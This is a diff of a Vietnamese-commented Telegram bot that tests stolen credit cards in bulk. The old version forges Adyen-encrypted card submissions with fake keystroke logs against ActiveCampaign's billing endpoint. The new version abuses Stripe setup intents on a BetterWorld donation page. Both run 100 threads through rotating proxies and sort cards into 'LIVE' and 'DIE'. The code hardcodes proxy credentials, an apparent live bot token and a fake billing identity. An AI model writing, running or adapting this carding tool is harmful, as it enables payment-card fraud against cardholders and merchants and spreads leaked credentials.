@@ -1,45 +1,34 @@
-import os
-import json
-import hmac
-import hashlib
-import base64
+import telebot
 import re
-import string
-import random
-import sys
 import time
 import uuid
-from datetime import datetime
 import threading
-import queue
-import asyncio
+import os
 import psutil
+import datetime
+from concurrent.futures import ThreadPoolExecutor
+from curl_cffi import requests
 
-# Thư viện Telegram Bot (V20+)
-from telegram import Update, InputFile
-from telegram.ext import ApplicationBuilder, CommandHandler, MessageHandler, ContextTypes, filters
-from telegram.constants import ParseMode
+# ==============================================================================
+# CẤU HÌNH BOT & PROXY
+# ==============================================================================
+API_TOKEN = '8110946929:AAGFn8gap9gMHH4_pABitcNd-saTGl24g0I'  # <--- THAY TOKEN CỦA BẠN Ở ĐÂY
+bot = telebot.TeleBot(API_TOKEN)
 
-# Thư viện mã hóa & Requests
-from Cryptodome.PublicKey import RSA
-from Cryptodome.Cipher import PKCS1_OAEP, AES
-from Cryptodome.Util.Padding import pad
-from jose import jwk
-import cloudscraper
-import requests
+# Proxy Configuration (Hardcoded)
+# Format gốc: IP:PORT:USER:PASS
+# asg.360s5.com:3600:88634867-zone-custom-region-SG:AetOKcLB
+PROXY_STR = "http://88634867-zone-custom-region-SG:AetOKcLB@asg.360s5.com:3600"
+PROXIES_CONF = {"http": PROXY_STR, "https": PROXY_STR}
 
-# ===================================================================
-# === CẤU HÌNH BOT
-# ===================================================================
-# ĐIỀN TOKEN BOT CỦA BẠN VÀO ĐÂY
-BOT_TOKEN = "YOUR_TELEGRAM_BOT_TOKEN" 
+# Global Variables
+MAX_WORKERS = 100  # Số luồng mặc định
 
-# ===================================================================
-# === PHẦN 1: CÁC HÀM VALIDATION THẺ (GIỮ NGUYÊN)
-# ===================================================================
+# ==============================================================================
+# PHẦN 1: HÀM HỖ TRỢ (GIỮ NGUYÊN TỪ CODE CŨ)
+# ==============================================================================
 
 def normalize_card(card_str):
-    """Chuẩn hóa chuỗi thẻ về định dạng cc|mm|yyyy|cvv."""
     pattern = r'(\d{13,19})[|/:](\d{1,2})[|/:](\d{2,4})[|/:](\d{3,4})'
     match = re.search(pattern, card_str)
     if not match:
@@ -53,14 +42,10 @@ def normalize_card(card_str):
     
     if len(year) == 2:
         year = '20' + year
-    year_int = int(year)
-    if year_int < 2000 or year_int > 2099:
-        return None
-        
+    
     return f"{card_num}|{month}|{year}|{cvv}"
 
 def validate_luhn(card_number):
-    """Kiểm tra thuật toán Luhn cho số thẻ."""
     card_num = ''.join(filter(str.isdigit, str(card_number)))
     if not card_num or len(card_num) < 13 or len(card_num) > 19:
         return False
@@ -75,531 +60,394 @@ def validate_luhn(card_number):
         total += n
     return total % 10 == 0
 
-def get_short_brand_name(cc):
-    first_digit = cc[0]
-    if first_digit in ['5', '2']: return 'mc'
-    elif first_digit == '4': return 'visa'
-    elif cc.startswith('34') or cc.startswith('37'): return 'amex'
-    elif cc.startswith('60') or cc.startswith('64') or cc.startswith('65'): return 'discover'
-    elif cc.startswith('62'): return 'cup'
-    elif cc.startswith('35'): return 'jcb'
-    elif cc.startswith('30') or cc.startswith('36') or cc.startswith('38'): return 'diners'
-    elif cc.startswith('67'): return 'maestro'
-    else: return 'unknown'
+def random_string(length=10):
+    import string, random
+    letters = string.ascii_lowercase
+    return ''.join(random.choice(letters) for i in range(length)) + "@gmail.com"
 
-# ===================================================================
-# === PHẦN 2: LOGIC MÃ HÓA ADYEN (GIỮ NGUYÊN)
-# ===================================================================
+# ==============================================================================
+# PHẦN 2: XỬ LÝ CHÍNH (CORE LOGIC - GIỮ NGUYÊN)
+# ==============================================================================
 
-def get_current_timestamp():
-    return datetime.utcnow().isoformat() + 'Z'
-
-def generate_fake_log(input_len):
-    log_entries = []
-    current_time = random.randint(2000, 5000)
-    log_entries.append(f"fo@{current_time}")
-    current_time += random.randint(50, 200)
-    log_entries.append(f"cl@{current_time}")
-    current_time += random.randint(100, 300)
-    for _ in range(input_len):
-        log_entries.append(f"KN@{current_time}")
-        current_time += random.randint(60, 180)
-    return ",".join(log_entries)
-
-def w(e):
-    t = e
-    if isinstance(t, str):
-        t = t.encode('utf-8')
-    return base64.b64encode(t).decode('utf-8')
-
-def _(e):
-    return w(e).replace('=', '').replace('+', '-').replace('/', '_')
-
-def k(e):
-    if not e:
-        return bytearray(0)
-    if len(e) % 2 == 1:
-        e = "0" + e
-    t = len(e) // 2
-    r = bytearray(t)
-    for n in range(t):
-        r[n] = int(e[n*2:n*2+2], 16)
-    return r
-
-bt = 2**32
-
-def mt(e, t, r):
-    if not (0 <= t < bt):
-        raise ValueError(f"value must be >= 0 and <= {bt - 1}. Received {t}")
-    e[r:r+4] = [(t >> 24) & 0xff, (t >> 16) & 0xff, (t >> 8) & 0xff, t & 0xff]
-
-class AdyenV4_8_0:
-    def __init__(self, site_key):
-        self.site_key = site_key
-        self.key_object = None
-
-    def generate_key(self):
-        parts = self.site_key.split("|")
-        if len(parts) != 2:
-            raise ValueError("Malformed public key: incorrect split parts")
-        part1 = parts[0]
-        part2 = parts[1]
-        decoded_part1 = k(part1)
-        decoded_part2 = k(part2)
-        encoded_part1 = _(decoded_part1)
-        encoded_part2 = _(decoded_part2)
-        self.key_object = {
-            "kty": "RSA",
-            "kid": "asf-key",
-            "e": encoded_part1,
-            "n": encoded_part2,
-            "alg": "RSA-OAEP",
-        }
-        return self.key_object
-
-    def encrypt_data(self, plain_text):
-        public_key = jwk.construct(self.key_object)
-        pem = public_key.to_pem().decode('utf-8')
-        rsa_key = RSA.import_key(pem)
-        random_bytes = os.urandom(64)
-        cipher_rsa = PKCS1_OAEP.new(rsa_key)
-        encrypted_key = cipher_rsa.encrypt(random_bytes)
-        cek = random_bytes
-        protected_header = {"alg":"RSA-OAEP","enc":"A256CBC-HS512","version":"1"}
-        protected_header_b64 = _(json.dumps(protected_header).encode('utf-8'))
-        _iv = os.urandom(16)
-        _plaintext = json.dumps(plain_text).encode('utf-8')
-        aes_key = cek[32:]
-        hmac_key = cek[:32]
-        cipher_aes = AES.new(aes_key, AES.MODE_CBC, _iv)
-        padded_plaintext = pad(_plaintext, AES.block_size)
-        ciphertext = cipher_aes.encrypt(padded_plaintext)
-        protected_header2_bytes = protected_header_b64.encode('utf-8')
-        f = len(protected_header2_bytes) * 8
-        d = f // bt
-        h_val = f % bt
-        y = bytearray(8)
-        mt(y, d, 0)
-        mt(y, h_val, 4)
-        hmac_obj = hmac.new(hmac_key, digestmod=hashlib.sha512)
-        hmac_obj.update(protected_header2_bytes + _iv + ciphertext + y)
-        tag = hmac_obj.digest()[:32]
-        return f"{protected_header_b64}.{_(encrypted_key)}.{_(_iv)}.{_(ciphertext)}.{_(tag)}"
-
-def format_card_number(card):
-    return ' '.join(card[i:i+4] for i in range(0, len(card), 4))
-
-def encrypt_card_data_480(card, month, year, cvc, adyen_key, stripe_key=None, domain=None):
-    if not all([card, month, year, cvc, adyen_key]):
-        raise ValueError("Missing card details or Adyen key")
-
-    if not stripe_key:
-        stripe_key = "live_2WKDYLJCMBFC5CFHBXY2CHZF4MUUJ7QU"
-    if not domain:
-        domain = "https://www.mytheresa.com"
-        
-    domain_b64 = base64.b64encode(domain.encode('utf-8')).decode('utf-8')
-    referrer = f"https://checkoutshopper-live.adyen.com/checkoutshopper/securedfields/{stripe_key}/5.5.0/securedFields.html?type=card&d={domain_b64}"
-    
-    card_number = format_card_number(card)
-    fake_number_log = generate_fake_log(16)
-    fake_cvc_log = generate_fake_log(3)
-
-    card_detail = {
-        "encryptedCardNumber": {
-            "number": card_number, 
-            "generationtime": get_current_timestamp(), 
-            "numberBind": "1", 
-            "activate": "3", 
-            "referrer": referrer, 
-            "numberFieldFocusCount": "1", 
-            "numberFieldLog": fake_number_log, 
-            "numberFieldClickCount": "1", 
-            "numberFieldKeyCount": "16"
-        },
-        "encryptedExpiryMonth": {"expiryMonth": month, "generationtime": get_current_timestamp()},
-        "encryptedExpiryYear": {"expiryYear": year, "generationtime": get_current_timestamp()},
-        "encryptedSecurityCode": {
-            "cvc": cvc, 
-            "generationtime": get_current_timestamp(), 
-            "cvcBind": "1", 
-            "activate": "4", 
-            "referrer": referrer, 
-            "cvcFieldFocusCount": "1", 
-            "cvcFieldLog": fake_cvc_log, 
-            "cvcFieldClickCount": "1", 
-            "cvcFieldKeyCount": "3", 
-            "cvcFieldChangeCount": "1", 
-            "cvcFieldBlurCount": "1", 
-            "deactivate": "2"
-        }
-    }
-
-    adyen_encryptor = AdyenV4_8_0(adyen_key)
-    adyen_encryptor.generate_key()
-    encrypted_details = {}
-    for key, value in card_detail.items():
-        encrypted_details[key] = adyen_encryptor.encrypt_data(value)
-    return encrypted_details
-
-def generate_checkout_attempt_id():
-    uuid_part = str(uuid.uuid4())
-    suffix = ''.join(random.choices(string.ascii_uppercase + string.digits, k=50))
-    return f"{uuid_part}{suffix}"
-
-# ===================================================================
-# === PHẦN 3: LOGIC CHECK THẺ (ĐÃ ĐIỀU CHỈNH CHO BOT)
-# ===================================================================
-
-def check_card_core(line_card):
+def check_card_core(cc, mes, ano, cvv):
     """
-    Hàm xử lý logic check thẻ, trả về dict kết quả thay vì in ra console.
+    Hàm xử lý logic check thẻ, trả về (status, message)
+    Status: 'LIVE', 'DIE', 'ERROR'
     """
-    start_time = time.time()
+    import random # Import lại để đảm bảo thread safe
     
-    line_card = line_card.strip()
-    normalized = normalize_card(line_card)
+    proxies = PROXIES_CONF
     
-    if not normalized:
-        return {'status': 'ERROR', 'msg': 'Format Error', 'full_line': line_card, 'time': 0}
-
-    cc, mm, yyyy, cvc = normalized.split('|')
-
-    if not validate_luhn(cc):
-        return {'status': 'ERROR', 'msg': 'Luhn Failed', 'full_line': normalized, 'time': 0}
-
-    ADYEN_PUB_KEY = "10001|C740E51C2E7CEDAFC96AA470E575907B40E84E861C8AB2F4952423F704ABC29255A37C24DED6068F7D1E394100DAD0636A8362FC1A5AAE658BB9DA4262676D3BFFE126D0DF11C874DB9C361A286005280AD45C06876395FB60977C25BED6969A3A586CD95A3BE5BE2016A56A5FEA4287C9B4CAB685A243CFA04DC5C115E11C2473B5EDC595D3B97653C0EA42CB949ECDEA6BC60DC9EDF89154811B5E5EBF57FDC86B7949BA300F679716F67378361FF88E33E012F31DB8A14B00C3A3C2698D2CA6D3ECD9AE16056EE8E13DFFE2C99E1135BBFCE4718822AB8EA74BEBA4B1B99BBE43F2A6CC70882B6E5E1A917F8264180BE6CD7956967B9D8429BF9C0808004F"
-    STRIPE_KEY = "live_CFDMTKEQ6RE5FPLXYTYYUGWJBUCBUWI7" 
-    TARGET_DOMAIN = "https://www.activecampaign.com"
-
-    data = {}
+    # === RETRY LOOP (Tối đa 20 lần - Giữ nguyên logic cũ) ===
     max_retries = 20
-    current_try = 0
-    success_request = False
+    messegner = ""
+    status = "DIE" # Mặc định là DIE trừ khi Approved
+    
+    start_time = time.time() # Bắt đầu tính giờ xử lý logic
 
-    while current_try < max_retries:
+    for attempt in range(max_retries):
         try:
-            encrypted_result = encrypt_card_data_480(
-                card=cc, month=mm, year=yyyy, cvc=cvc, 
-                adyen_key=ADYEN_PUB_KEY, stripe_key=STRIPE_KEY, domain=TARGET_DOMAIN
+            session = requests.Session(
+                impersonate="chrome124",
+                proxies=proxies,
+                timeout=30
             )
+            
+            url_const = "https://bubstrong.betterworld.org"
+            email_random = random_string(10)
 
-            email = ''.join(random.choices(string.ascii_lowercase + string.digits, k=10)) + '@gmail.com'
-            city = 'New York' 
-            telephoneNumber = ''.join(random.choices(string.digits, k=10))
-            name = ''.join(random.choices(string.ascii_letters + ' ', k=10)).strip()
-            attempt_id = generate_checkout_attempt_id()
-
-            headers = {
-                'accept': 'application/json, text/plain, */*',
-                'accept-language': 'en-US,en;q=0.9',
-                'cache-control': 'no-cache',
-                'content-type': 'application/json',
-                'sec-ch-ua-mobile': '?0',
-                'sec-ch-ua-platform': '"Windows"',
-                'origin': 'https://www.activecampaign.com',
-                'pragma': 'no-cache',
-                'referer': 'https://www.activecampaign.com/signup/?code=ac&tier=starter&contacts=1000&currency=USD',
-                'sec-fetch-dest': 'empty',
-                'sec-fetch-mode': 'cors',
-                'sec-fetch-site': 'same-origin',
+            # --- BƯỚC 1: REQUEST STRIPE ---
+            stripe_url = "https://api.stripe.com/v1/payment_methods"
+            
+            guid = str(uuid.uuid4())
+            muid = str(uuid.uuid4())
+            sid = str(uuid.uuid4())
+            
+            stripe_payload = {
+                "type": "card",
+                "card[number]": cc,
+                "card[cvc]": cvv,
+                "card[exp_year]": ano,
+                "card[exp_month]": mes,
+                "allow_redisplay": "unspecified",
+                "billing_details[address][postal_code]": "53227",
+                "billing_details[address][country]": "US",
+                "billing_details[address][line1]": "2830 Oakridge Farm Lane",
+                "billing_details[address][city]": "West Allis",
+                "billing_details[address][state]": "WI",
+                "billing_details[name]": "Minh Nhat",
+                "payment_user_agent": "stripe.js/f47b5e380c; stripe-js-v3/f47b5e380c; payment-element; deferred-intent; autopm",
+                "referrer": url_const,
+                "time_on_page": str(random.randint(45000, 120000)),
+                "guid": guid,
+                "muid": muid,
+                "sid": sid,
+                "key": "pk_live_aGE2zfplg4kOqYZ4QWKOM9ah"
             }
 
-            json_data = {
-                'paymentMethod': {
-                    'type': 'scheme',
-                    'holderName': name,
-                    'encryptedCardNumber': encrypted_result['encryptedCardNumber'],
-                    'encryptedExpiryMonth': encrypted_result['encryptedExpiryMonth'],
-                    'encryptedExpiryYear': encrypted_result['encryptedExpiryYear'],
-                    'encryptedSecurityCode': encrypted_result['encryptedSecurityCode'],
-                    'brand': get_short_brand_name(cc),
-                    'checkoutAttemptId': attempt_id,
-                },
-                'shopperEmail': email,
-                'shopperName': name,
-                'billingAddress': {'city': city, 'country': 'US', 'houseNumberOrName': '123', 'postalCode': '10001', 'stateOrProvince': 'NY', 'street': 'Broadway'},
-                'telephoneNumber': telephoneNumber,
-                'amount': {'value': 0, 'currency': 'USD'},
-                'returnUrl': 'https://www.activecampaign.com/signup/?code=ac&tier=starter&contacts=1000&currency=USD',
+            headers_stripe = {
+                "Accept": "application/json",
+                "Content-Type": "application/x-www-form-urlencoded",
+                "Origin": "https://js.stripe.com",
+                "Referer": "https://js.stripe.com/"
             }
 
-            session_id = ''.join(random.choices(string.ascii_letters + string.digits, k=8))
-            proxy_host = "aus.360s5.com"
-            proxy_port = "3600"
-            base_auth = "88634867-zone-custom"
-            pass_auth = "AetOKcLB"
-            proxy_auth_str = f"{base_auth}-session-{session_id}:{pass_auth}"
-            proxy_full_url = f"http://{proxy_auth_str}@{proxy_host}:{proxy_port}"
+            req1 = session.post(stripe_url, data=stripe_payload, headers=headers_stripe)
+            json_stripe = req1.json()
             
-            proxies = {"http": proxy_full_url, "https": proxy_full_url}
-
-            scraper = cloudscraper.create_scraper(
-                browser={'browser': 'chrome', 'platform': 'windows', 'desktop': True}
-            )
-
-            response = scraper.post(
-                'https://www.activecampaign.com/api/billing/adyen/payments',
-                json=json_data, headers=headers, proxies=proxies, timeout=30
-            )
-
-            if response.status_code == 200:
-                try:
-                    data = response.json()
-                    success_request = True
-                    break
-                except json.JSONDecodeError:
-                    pass
-            
-        except Exception as e:
-            pass
-        
-        current_try += 1
-        time.sleep(1.5)
-
-    end_time = time.time()
-    time_taken = round(end_time - start_time, 2)
-
-    if not success_request:
-        return {
-            'status': 'ERROR', 
-            'result_string': f"{cc}|{mm}|{yyyy}|{cvc}|ERROR|NET|MAX_RETRIES|Time:{time_taken}s",
-            'time_taken': time_taken
-        }
-
-    additionalData = data.get('additionalData', {})
-    cvcResultRaw = additionalData.get('cvcResultRaw', 'N/A')
-    cvcResult = additionalData.get('cvcResult', 'N/A')
-    avsResultRaw = additionalData.get('avsResultRaw', 'N/A')
-    avsResult = additionalData.get('avsResult', 'N/A')
-    refusalReasonRaw = additionalData.get('refusalReasonRaw', 'N/A')
-    resultCode = data.get('resultCode', additionalData.get('resultCode', 'N/A'))
-    message = data.get('message', 'N/A')
-    refusalReason = data.get('refusalReason', additionalData.get('refusalReason', 'N/A'))
-
-    msg = ""
-    status = ""
-
-    if resultCode == "Authorised" or resultCode == "Cancelled":
-        status = "LIVE"
-        msg = "APPROVED ✅"
-    elif resultCode == "Refused":
-        status = "DIE"
-        msg = f"DIE - {refusalReason}"
-    elif resultCode in ["IdentifyShopper", "ChallengeShopper", "RedirectShopper"]:
-        status = "DIE" # 3DS tính là DIE hoặc UNK tùy quy ước, ở đây để DIE cho dễ lọc
-        msg = "3DS - 3D Secure required"
-    else:
-        status = "DIE"
-        msg = f"UNK - {message if message != 'N/A' else resultCode}"
-
-    result_string = f"{cc}|{mm}|{yyyy}|{cvc}|{cvcResultRaw}|{cvcResult}|{avsResultRaw}|{avsResult}|{resultCode}|{refusalReasonRaw}|{msg}|Time: {time_taken}s"
-
-    return {
-        'status': status,
-        'result_string': result_string,
-        'time_taken': time_taken
-    }
-
-# ===================================================================
-# === PHẦN 4: TELEGRAM BOT HANDLERS
-# ===================================================================
-
-# Global Stats Storage (Đơn giản hóa cho 1 phiên chạy)
-session_stats = {
-    'total': 0,
-    'checked': 0,
-    'live': 0,
-    'die': 0,
-    'error': 0,
-    'start_time': 0,
-    'is_running': False,
-    'live_list': [],
-    'die_list': []
-}
-
-async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
-    await update.message.reply_text(
-        "🤖 **Bot Adyen Checker v2.1**\n"
-        "💻 Server: Ubuntu\n\n"
-        "📝 **Lệnh:**\n"
-        "- Gửi file `.txt` để check list (100 luồng).\n"
-        "- `/st cc|mm|yy|cvv` để check lẻ.",
-        parse_mode=ParseMode.MARKDOWN
-    )
-
-async def check_single_card(update: Update, context: ContextTypes.DEFAULT_TYPE):
-    text = update.message.text
-    try:
-        card_raw = text.split('/st ')[1].strip()
-    except IndexError:
-        await update.message.reply_text("⚠️ Vui lòng nhập đúng định dạng: `/st cc|mm|yy|cvv`", parse_mode=ParseMode.MARKDOWN)
-        return
-
-    msg = await update.message.reply_text("🔄 Đang kiểm tra...")
-    
-    # Chạy trong Thread riêng để không block bot
-    loop = asyncio.get_running_loop()
-    result = await loop.run_in_executor(None, check_card_core, card_raw)
-    
-    if result.get('status') == 'ERROR' and result.get('msg'):
-         await msg.edit_text(f"❌ Lỗi: {result['msg']}")
-    else:
-        await msg.edit_text(f"📝 Kết quả:\n`{result['result_string']}`", parse_mode=ParseMode.MARKDOWN)
-
-# --- XỬ LÝ FILE (MULTITHREADING) ---
-
-def worker_thread(q, stats_lock):
-    while True:
-        card = q.get()
-        if card is None:
-            break
-        try:
-            res = check_card_core(card)
-            with stats_lock:
-                session_stats['checked'] += 1
-                if res['status'] == 'LIVE':
-                    session_stats['live'] += 1
-                    session_stats['live_list'].append(res['result_string'])
-                elif res['status'] == 'DIE':
-                    session_stats['die'] += 1
-                    session_stats['die_list'].append(res['result_string'])
+            if "error" in json_stripe:
+                err_code = json_stripe["error"].get("code", "")
+                message = json_stripe['error'].get('message', '')
+                messegner = f"Stripe Error: {message}"
+                if err_code in ["invalid_cvc", "incorrect_number", "card_declined", "expired_card"]:
+                    status = "DIE"
+                    break 
                 else:
-                    session_stats['error'] += 1
-        except Exception:
-            with stats_lock:
-                session_stats['error'] += 1
-        finally:
-            q.task_done()
+                    raise Exception("Stripe Rate Limit or Unknown Error")
 
-async def handle_document(update: Update, context: ContextTypes.DEFAULT_TYPE):
-    global session_stats
-    
-    if session_stats['is_running']:
-        await update.message.reply_text("⚠️ Đang có một tiến trình chạy. Vui lòng chờ xong.")
-        return
+            pm_id = json_stripe.get("id")
+            if not pm_id:
+                raise Exception("Missing PM ID")
 
-    document = update.message.document
-    if not document.file_name.endswith('.txt'):
-        await update.message.reply_text("❌ Chỉ chấp nhận file .txt")
-        return
+            # --- BƯỚC 2: GET TRANG DONATE ---
+            donate_url = "https://bubstrong.betterworld.org/donate"
+            headers_get = {
+                "Referer": "https://bubstrong.betterworld.org/",
+                "Upgrade-Insecure-Requests": "1"
+            }
 
-    file = await document.get_file()
-    file_content = await file.download_as_bytearray()
-    content_str = file_content.decode('utf-8', errors='ignore')
-    cards = [line.strip() for line in content_str.splitlines() if line.strip()]
+            req2 = session.get(donate_url, headers=headers_get)
+            if req2.status_code != 200:
+                raise Exception(f"Get Page Failed: {req2.status_code}")
 
-    if not cards:
-        await update.message.reply_text("❌ File trống.")
-        return
+            html_source = req2.text
+            match_au = re.search(r'bwc&quot;:&quot;(.*?)&quot', html_source)
+            match_token = re.search(r'<meta name="csrf-token" content="(.*?)"', html_source)
+            
+            if not match_au or not match_token:
+                raise Exception("Missing Tokens")
 
-    # Reset Stats
-    session_stats = {
-        'total': len(cards), 'checked': 0, 'live': 0, 'die': 0, 'error': 0,
-        'start_time': time.time(), 'is_running': True,
-        'live_list': [], 'die_list': []
-    }
+            au_token = match_au.group(1)
+            csrf_token = match_token.group(1)
 
-    status_msg = await update.message.reply_text(
-        f"🚀 Bắt đầu check {len(cards)} thẻ với 100 luồng..."
-    )
+            # --- BƯỚC 3: SETUP INTENTS ---
+            setup_url = "https://api.betterworld.org/v1/user-payments/setup-intents"
+            headers_bw = {
+                "accept": "application/json, text/javascript, */*; q=0.01",
+                "content-type": "application/x-www-form-urlencoded; charset=UTF-8",
+                "origin": "https://bubstrong.betterworld.org",
+                "referer": "https://bubstrong.betterworld.org/",
+                "x-auth-token": au_token,
+                "x-bw-src": "l",
+                "x-csrf-token": csrf_token,
+                "x-requested-with": "XMLHttpRequest"
+            }
+            
+            data_setup = {
+                "email": email_random,
+                "payment_method_type": "card",
+                "is_widget": "0"
+            }
 
-    # Setup Threading
-    q = queue.Queue()
-    for card in cards:
-        q.put(card)
-    
-    num_threads = 100
-    threads = []
-    stats_lock = threading.Lock()
+            req3 = session.post(setup_url, data=data_setup, headers=headers_bw)
+            json_setup = req3.json()
+            
+            if "data" in json_setup and "user_setup_intent_id" in json_setup["data"]:
+                intent_id = json_setup["data"]["user_setup_intent_id"]
+            else:
+                raise Exception("Missing Intent ID")
 
-    for _ in range(num_threads):
-        t = threading.Thread(target=worker_thread, args=(q, stats_lock))
-        t.start()
-        threads.append(t)
+            # --- BƯỚC 4: CONFIRM ---
+            confirm_url = f"https://api.betterworld.org/v1/user-payments/setup-intents/{intent_id}/confirm"
+            headers_bw["origin"] = url_const
+            headers_bw["referer"] = url_const
+            
+            data_confirm = {
+                "payment_method_type": "card",
+                "stripe_payment_method_id": pm_id,
+                "is_widget": "0"
+            }
 
-    # Loop update message
-    last_checked = 0
-    while any(t.is_alive() for t in threads) or not q.empty():
-        await asyncio.sleep(2) # Update mỗi 2s để tránh flood
-        
-        # Calculate Stats
-        elapsed = time.time() - session_stats['start_time']
-        checked = session_stats['checked']
-        cpm = int((checked / elapsed) * 60) if elapsed > 0 else 0
-        
-        # System Stats
-        cpu = psutil.cpu_percent()
-        ram = psutil.virtual_memory().percent
-        
-        text = (
-            f"⚡ **Adyen Checker Running...**\n"
-            f"━━━━━━━━━━━━━━━━━━\n"
-            f"💳 Total: {session_stats['total']}\n"
-            f"✅ Live: {session_stats['live']}\n"
-            f"💀 Die: {session_stats['die']}\n"
-            f"⚠️ Error: {session_stats['error']}\n"
-            f"🔄 Checked: {checked}/{session_stats['total']}\n"
-            f"━━━━━━━━━━━━━━━━━━\n"
-            f"🚀 CPM: {cpm}\n"
-            f"🖥 CPU: {cpu}% | RAM: {ram}%\n"
-            f"⏱ Time: {int(elapsed)}s"
-        )
-        
-        # Chỉ edit nếu có thay đổi
-        if checked != last_checked:
+            req4 = session.post(confirm_url, data=data_confirm, headers=headers_bw)
+            response_text = req4.text
+            
             try:
-                await status_msg.edit_text(text, parse_mode=ParseMode.MARKDOWN)
-                last_checked = checked
-            except Exception:
-                pass # Bỏ qua lỗi flood wait nhỏ
-        
-        if checked == session_stats['total']:
+                json_confirm = req4.json()
+                error_desc = json_confirm.get("error_description", "")
+            except:
+                error_desc = ""
+
+            if "user_payment_method_id" in response_text and req4.status_code in [200, 201]:
+                messegner = "APPROVED V3✅"
+                status = "LIVE"
+            elif error_desc:
+                messegner = f"[CUSTOM] {error_desc}"
+                status = "DIE"
+            elif "security code is incorrect" in response_text or "incorrect_cvc" in response_text:
+                messegner = "CCN - Incorrect CVV"
+                status = "DIE"
+            elif "insufficient_funds" in response_text:
+                messegner = "CVV - Insufficient Funds"
+                status = "DIE"
+            elif req4.status_code == 403:
+                raise Exception("403 Forbidden")
+            else:
+                messegner = f"[DECLINED] {response_text[:50]}"
+                status = "DIE"
+            
             break
 
-    # Dừng threads
-    for _ in range(num_threads):
-        q.put(None)
-    for t in threads:
-        t.join()
+        except Exception as e:
+            if attempt == max_retries - 1:
+                messegner = f"ERROR - MAX RETRIES ({str(e)})"
+                status = "ERROR"
+            else:
+                time.sleep(1)
+                continue
+    
+    time_taken = round(time.time() - start_time, 2)
+    return status, messegner, time_taken
 
-    session_stats['is_running'] = False
+# ==============================================================================
+# PHẦN 3: BOT HANDLERS & MULTI-THREADING CONTROL
+# ==============================================================================
+
+# Biến lưu trạng thái tasks
+tasks = {}
+
+class TaskInfo:
+    def __init__(self, chat_id, total):
+        self.chat_id = chat_id
+        self.total = total
+        self.checked = 0
+        self.live = 0
+        self.die = 0
+        self.error = 0
+        self.start_time = time.time()
+        self.is_running = True
+        self.live_lines = []
+        self.die_lines = []
+
+@bot.message_handler(commands=['start'])
+def send_welcome(message):
+    bot.reply_to(message, "🚀 *Bot Ready!*\n\n👉 Gửi file `.txt` (list thẻ) để check 100 luồng.\n👉 Dùng lệnh `/st cc|mm|yy|cvv` để check lẻ.", parse_mode="Markdown")
+
+@bot.message_handler(commands=['st'])
+def check_single_card(message):
+    try:
+        raw_data = message.text.replace("/st", "").strip()
+        if not raw_data:
+            bot.reply_to(message, "⚠️ Vui lòng nhập thông tin thẻ. Ví dụ: `/st 444444|12|25|123`", parse_mode="Markdown")
+            return
+
+        normalized = normalize_card(raw_data)
+        if not normalized:
+            bot.reply_to(message, "❌ Định dạng thẻ sai!", parse_mode="Markdown")
+            return
+        
+        cc, mes, ano, cvv = normalized.split('|')
+        
+        if not validate_luhn(cc):
+            bot.reply_to(message, f"❌ Luhn Check Failed: {cc}", parse_mode="Markdown")
+            return
+
+        msg = bot.reply_to(message, "⏳ Đang xử lý...", parse_mode="Markdown")
+        
+        # Chạy check
+        status, result_msg, time_taken = check_card_core(cc, mes, ano, cvv)
+        
+        # Format kết quả trả về đúng yêu cầu
+        full_result = f"{cc}|{mes}|{ano}|{cvv}|{result_msg}"
+        
+        icon = "✅" if status == "LIVE" else "❌"
+        response = f"{icon} *{status}*\n`{full_result}`\n⏱ Time taken: {time_taken}s"
+        
+        bot.edit_message_text(chat_id=message.chat.id, message_id=msg.message_id, text=response, parse_mode="Markdown")
+
+    except Exception as e:
+        bot.reply_to(message, f"Lỗi: {e}")
+
+@bot.message_handler(content_types=['document'])
+def handle_file(message):
+    try:
+        file_info = bot.get_file(message.document.file_id)
+        downloaded_file = bot.download_file(file_info.file_path)
+        
+        # Lưu tạm file
+        temp_filename = f"check_{message.chat.id}_{int(time.time())}.txt"
+        with open(temp_filename, 'wb') as new_file:
+            new_file.write(downloaded_file)
+        
+        # Đọc file
+        with open(temp_filename, 'r', encoding='utf-8', errors='ignore') as f:
+            lines = [line.strip() for line in f if line.strip()]
+        
+        total = len(lines)
+        if total == 0:
+            bot.reply_to(message, "❌ File rỗng!")
+            os.remove(temp_filename)
+            return
+
+        # Khởi tạo Task
+        task = TaskInfo(message.chat.id, total)
+        tasks[message.chat.id] = task
+        
+        msg = bot.reply_to(message, f"⚡️ Đang khởi động check {total} thẻ với 100 luồng...", parse_mode="Markdown")
+        
+        # Bắt đầu luồng cập nhật trạng thái
+        threading.Thread(target=status_updater, args=(message.chat.id, msg.message_id)).start()
+        
+        # Bắt đầu luồng xử lý chính
+        threading.Thread(target=process_bulk, args=(message.chat.id, lines, temp_filename)).start()
+
+    except Exception as e:
+        bot.reply_to(message, f"Lỗi nhận file: {e}")
+
+def get_system_usage():
+    cpu = psutil.cpu_percent()
+    ram = psutil.virtual_memory().percent
+    return cpu, ram
+
+def status_updater(chat_id, message_id):
+    task = tasks.get(chat_id)
+    if not task: return
+
+    while task.is_running and task.checked < task.total:
+        time.sleep(2) # Cập nhật mỗi 2s để tránh flood limit telegram
+        try:
+            elapsed = time.time() - task.start_time
+            cpm = int((task.checked / elapsed) * 60) if elapsed > 0 else 0
+            cpu, ram = get_system_usage()
+            
+            text = (
+                f"⚡️ *Checking Status* ⚡️\n"
+                f"━━━━━━━━━━━━━━━━━━\n"
+                f"🔢 Total: `{task.total}`\n"
+                f"✅ Live: `{task.live}`\n"
+                f"❌ Die: `{task.die}`\n"
+                f"⚠️ Error: `{task.error}`\n"
+                f"🔄 Checked: `{task.checked}`\n"
+                f"🚀 CPM: `{cpm}`\n"
+                f"🖥 CPU: `{cpu}%` | RAM: `{ram}%`\n"
+                f"━━━━━━━━━━━━━━━━━━"
+            )
+            bot.edit_message_text(chat_id=chat_id, message_id=message_id, text=text, parse_mode="Markdown")
+        except Exception:
+            pass # Bỏ qua lỗi nếu edit quá nhanh
+
+def process_bulk(chat_id, lines, filename):
+    task = tasks.get(chat_id)
+    
+    def worker(line):
+        normalized = normalize_card(line)
+        if not normalized:
+            task.checked += 1 # Tính là đã check dù lỗi format
+            return
+            
+        cc, mes, ano, cvv = normalized.split('|')
+        
+        if not validate_luhn(cc):
+            task.checked += 1
+            return
+
+        status, result_msg, time_taken = check_card_core(cc, mes, ano, cvv)
+        
+        full_res = f"{cc}|{mes}|{ano}|{cvv}|{result_msg}|Time:{time_taken}s" # Format yêu cầu nhưng thêm time vào cuối log
+        # Format string yêu cầu chính xác: result_string = f"{cc}|{mes}|{ano}|{cvv}|{messegner}"
